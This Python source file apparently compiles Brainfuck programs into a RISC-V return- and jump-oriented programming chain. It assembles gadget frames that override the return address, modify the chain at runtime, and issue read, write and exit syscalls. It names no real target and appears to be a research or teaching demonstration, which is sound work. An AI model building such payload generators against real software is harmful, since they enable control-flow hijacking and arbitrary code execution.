from bf_parser.jop_gadgets.increment_a3 import *
from bf_parser.jop_gadgets.increment_s0 import *
from bf_parser.jop_gadgets.initialize_a2 import *
from bf_parser.jop_gadgets.initialize_a3 import *
from bf_parser.jop_gadgets.initialize_a3_a7 import *
from bf_parser.jop_gadgets.store_s0 import *
from bf_parser.jop_gadgets.load_s0 import *
from bf_parser.jop_gadgets.li_a1_0 import *
from bf_parser.jop_gadgets.mov_s0_a0 import *

from bf_parser.rop_gadgets.copy_a3 import *
from bf_parser.rop_gadgets.restore_a3 import *
from bf_parser.rop_gadgets.mov_a0_s0 import *
from bf_parser.rop_gadgets.and_a3_s0 import *
from bf_parser.rop_gadgets.charger import *
from bf_parser.rop_gadgets.store_a0 import*
from bf_parser.jop_gadgets.init_args import *
from bf_parser.rop_gadgets.ecall import *

class BF_Parser():
    def __init__(self, bf_code):
        self.__bf_code = bf_code

        # rop gadget objects
        self.__charger    = Charger()
        self.__copy_a3    = CopyA3()
        self.__restore_a3 = RestoreA3()
        self.__mov_a0_s0  = MovA0_S0()
        self.__and_a3_s0  = AndA3_S0()
        self.__store_a0   = StoreA0()

        # jop gadget objects
        self.__init_a3    = InitializeA3()
        self.__inc_a3     = IncrementA3()
        self.__load_s0    = LoadS0()
        self.__inc_s0     = IncrementS0()
        self.__store_s0   = StoreS0()
        self.__init_a7    = InitializeA5_A7()
        self.__init_args  = InitializeArgs()
        self.__ecall      = Ecall()

    def get_instruction_len(self, instruction):
        if instruction == '>' or instruction == '<':
            return self.__charger.get_frame_size()

        elif instruction == '+' or instruction == '-':
            return 3 *  self.__charger.get_frame_size() + \
                   self.__copy_a3.get_frame_size() + \
                   self.__restore_a3.get_frame_size() + \
                   self.__mov_a0_s0.get_frame_size() + \
                   self.__and_a3_s0.get_frame_size() + \
                   self.__store_a0.get_frame_size()

        elif instruction == '.' or instruction == ',':
            return 2 * self.__charger.get_frame_size() + \
                   self.__ecall.get_frame_size() + \
                   self.__copy_a3.get_frame_size() + \
                   self.__restore_a3.get_frame_size() + \
                   self.__and_a3_s0.get_frame_size()

        elif instruction == '[':
            return 0

        elif instruction == ']':
            return 0

    def get_payload_len(self):
        # return the number of bytes of the generated rop chain

        total_len = 8 + self.__charger.get_frame_size() # for the initialization

        for instruction in self.__bf_code:
            total_len += self.get_instruction_len(instruction)

        total_len += self.__charger.get_frame_size() # for exit(0) syscall

        return total_len

    def parse(self, pointer_start, initial_sp):
        addr_mask = 0x3fffffffff # to restore the address using only the lower 32 bits

        current_sp = initial_sp # acts like a program counter

        # initialize a3 to point to the middle of the tape
        rop_chain = self.__charger.print_vaddr() # charger address that overrides $ra
        rop_chain += self.__charger.construct_frame(ra=self.__init_a3.get_vaddr(), s4=self.__charger.get_vaddr(), s7=pointer_start)

        current_sp += self.__charger.get_frame_size()

        for instruction in self.__bf_code:
            if instruction == '>' or instruction == '<':
                increment = 0x8 if instruction == '>' else -0x8

                # construct rop chain
                rop_chain += self.__charger.construct_frame(ra=self.__inc_a3.get_vaddr(), \
                                                            s1=increment, \
                                                            s4=self.__charger.get_vaddr() \
                                                            )

                # advance sp
                current_sp += self.get_instruction_len(instruction)

            elif instruction == '+' or instruction == '-':
                increment = 1 if instruction == '+' else -1

                backup_addr = current_sp + \
                              3 * self.__charger.get_frame_size() + \
                              self.__copy_a3.get_frame_size() + \
                              self.__mov_a0_s0.get_frame_size() + \
                              self.__restore_a3.get_frame_size() + \
                              0x10 # offset for s0

                print(f"\nSelf modifying ROP address: {hex(backup_addr)}\n")

                #construct rop chain
                rop_chain += self.__charger.construct_frame(ra=self.__copy_a3.get_vaddr(), \
                                                            s0=backup_addr \
                                                            )

                rop_chain += self.__copy_a3.construct_frame(ra=self.__charger.get_vaddr())

                rop_chain += self.__charger.construct_frame(ra=self.__inc_a3.get_vaddr(), \
                                                            s1=-0x60, \
                                                            s4=self.__charger.get_vaddr() \
                                                            )

                rop_chain += self.__charger.construct_frame(ra=self.__load_s0.get_vaddr(), \
                                                            s1=self.__mov_a0_s0.get_vaddr(), \
                                                            s4=self.__inc_s0.get_vaddr(), \
                                                            s5=1, \
                                                            s7=self.__store_s0.get_vaddr(), \
                                                            s11=increment
                                                            )

                rop_chain += self.__mov_a0_s0.construct_frame(ra=self.__restore_a3.get_vaddr(), \
                                                              s0=backup_addr - 0x40, \
                                                              s3=1 \
                                                              )

                rop_chain += self.__restore_a3.construct_frame(ra=self.__and_a3_s0.get_vaddr(), \
                                                               s0=addr_mask, \
                                                               s2=1 \
                                                               )
                
                rop_chain += self.__and_a3_s0.construct_frame(ra=self.__store_a0.get_vaddr(), \
                                                              s0=addr_mask # will contain address written at runtime
                                                              ) 

                rop_chain += self.__store_a0.construct_frame(ra=self.__charger.get_vaddr())

                # advance sp
                current_sp += self.get_instruction_len(instruction)

            elif instruction == '.' or instruction == ',':
                file_descriptor = 1 if instruction == '.' else 0
                syscall_no = 64 if instruction == '.' else 63

                backup_addr = current_sp + \
                              self.__charger.get_frame_size() + \
                              self.__copy_a3.get_frame_size() + \
                              0x58 # offset for s1

                print(f"\nSelf modifying ROP address:   {hex(backup_addr)}")

                # construct rop chain
                rop_chain += self.__charger.construct_frame(ra=self.__copy_a3.get_vaddr(), \
                                                            s0=backup_addr, \
                                                            s4=self.__charger.get_vaddr(), \
                                                            s5=syscall_no, \
                                                            s7=self.__charger.get_vaddr()
                                                            )

                rop_chain += self.__copy_a3.construct_frame(ra=self.__init_a7.get_vaddr())    

                rop_chain += self.__charger.construct_frame(ra=self.__init_args.get_vaddr(), \
                                                            s2=1, \
                                                            s6=1, \
                                                            s7=self.__ecall.get_vaddr(), \
                                                            s10=file_descriptor, \
                                                            s1=addr_mask # will contain address written at runtime
                                                            )

                rop_chain += self.__ecall.construct_frame(ra=self.__restore_a3.get_vaddr(), \
                                                          s0=backup_addr - 0x40 \
                                                          )
                                        
                rop_chain += self.__restore_a3.construct_frame(ra=self.__and_a3_s0.get_vaddr(), \
                                                               s0=addr_mask 
                                                               )

                rop_chain += self.__and_a3_s0.construct_frame(ra=self.__charger.get_vaddr())

                # advance sp
                current_sp += self.get_instruction_len(instruction)

            elif instruction == '[':
                pass

            elif instruction == ']':
                pass

        # end with an exit syscall
        exit_syscall_no = 93
        rop_chain += self.__charger.construct_frame(ra=self.__init_a7.get_vaddr(), \
                                                    s2=1, \
                                                    s4=self.__init_args.get_vaddr(), \
                                                    s5=exit_syscall_no, \
                                                    s7=self.__ecall.get_vaddr() \
                                                    )

        return rop_chain